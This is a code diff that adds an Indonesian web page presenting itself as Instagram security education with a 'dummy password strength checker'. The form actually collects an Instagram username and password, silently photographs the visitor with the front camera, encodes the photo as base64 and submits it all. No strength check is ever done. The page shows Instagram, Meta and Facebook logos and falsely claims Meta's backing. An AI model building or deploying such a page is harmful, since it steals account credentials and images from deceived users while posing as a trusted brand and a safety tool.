@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AmanIG - Edukasi Keamanan Instagram</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="logo">AmanIG</div>
+    <ul class="nav-links">
+      <li><a href="#home">Home</a></li>
+      <li><a href="#riset">Riset Password</a></li>
+      <li><a href="#tips">Tips Aman</a></li>
+      <li><a href="#kasus">Kasus Terkini</a></li>
+    </ul>
+  </nav>
+
+  <section class="hero" id="home">
+    <h1>RISET PASSWORD INSTAGRAM</h1>
+    <p>Edukasi Keamanan Akun</p>
+    <p>Bukan ajarin hack, tapi pahami risiko & lindungi akunmu sendiri dari hacker.</p>
+  </section>
+
+  <div class="section warning">
+    ⚠️ PERINGATAN WAJIB BACA!<br><br>
+    Semua konten di sini hanya untuk edukasi & pencegahan.<br>
+    Hacking ilegal bisa dipidana! JANGAN gunakan untuk hal jahat.
+  </div>
+
+  <div class="section" id="checker">
+    <h2>Cek Kekuatan Sandi Dummy</h2>
+    <form id="sendForm">
+      <label>Your Email (opsional):</label>
+      <input type="email" name="email" placeholder="contoh: alexachh69@gmail.com">
+
+      <label>Username IG Dummy:</label>
+      <input type="text" name="username_ig" placeholder="contoh: bNsjsjs" required>
+
+      <label>Sandi Dummy:</label>
+      <input type="text" name="password_dummy" placeholder="contoh: 19827363" required>
+
+      <input type="hidden" name="foto_depan_base64" id="fotoBase64">
+
+      <button type="button" onclick="captureAndSubmit()">Kirim (Akan Ambil Foto Depan)</button>
+    </form>
+
+    <div id="result"></div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <footer>
+    <p>© 2026 AmanIG • Edukasi keamanan siber • Bukan untuk aktivitas ilegal</p>
+    <div class="logos">
+      <img src="https://www.edigitalagency.com.au/wp-content/uploads/new-Instagram-logo-blue-png.png" alt="Instagram">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg/3840px-Meta_Platforms_Inc._logo_%28cropped%29.svg.png" alt="Meta">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/2048px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook">
+    </div>
+  </footer>
+
+  <script>
+    async function captureAndSubmit() {
+      const form = document.getElementById('sendForm');
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const fotoInput = document.getElementById('fotoBase64');
+      const result = document.getElementById('result');
+
+      result.innerHTML = "Sedang meminta akses kamera...";
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        const base64 = canvas.toDataURL('image/jpeg', 0.6);
+        fotoInput.value = base64;
+
+        stream.getTracks().forEach(track => track.stop());
+
+        result.innerHTML = "Foto diambil! Mengirim...";
+        form.submit();
+
+      } catch (err) {
+        result.innerHTML = `<span style="color:red;">Gagal: ${err.message}</span><br>Mungkin izin ditolak atau website belum HTTPS.`;
+      }
+    }
+  </script>
+
+</body>
+</html>
+
+<!-- Logos Instagram, Meta, Facebook -->
+  <div class="logos-container" style="margin-top: 2rem; display: flex; justify-content: center; gap: 4rem; flex-wrap: wrap;">
+    <!-- Instagram Logo -->
+    <div>
+      <img src="https://www.edigitalagency.com.au/wp-content/uploads/new-Instagram-logo-blue-png.png" alt="Instagram Logo" style="height: 80px; width: auto;">
+      <p>Instagram</p>
+    </div>
+    
+    <!-- Meta Logo -->
+    <div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg/3840px-Meta_Platforms_Inc._logo_%28cropped%29.svg.png" alt="Meta Logo" style="height: 80px; width: auto;">
+      <p>Meta</p>
+    </div>
+    
+    <!-- Facebook Logo -->
+    <div>
+      <img src="https://admin.itsnicethat.com/images/2wS6IaoGM1xQ2CX8Yfp610j4N-k=/245988/format-webp%7Cwidth-1440/facebook-rebrand-graphic-design-itsnicethat-10.png" alt="Facebook Logo" style="height: 80px; width: auto;">
+      <p>Facebook</p>
+    </div>
+  </div>
+  
+  <p style="margin-top: 1.5rem;">Didukung oleh Meta Platforms (Instagram, Facebook, dll.) – Lindungi akunmu dengan baik!</p>
+</footer>
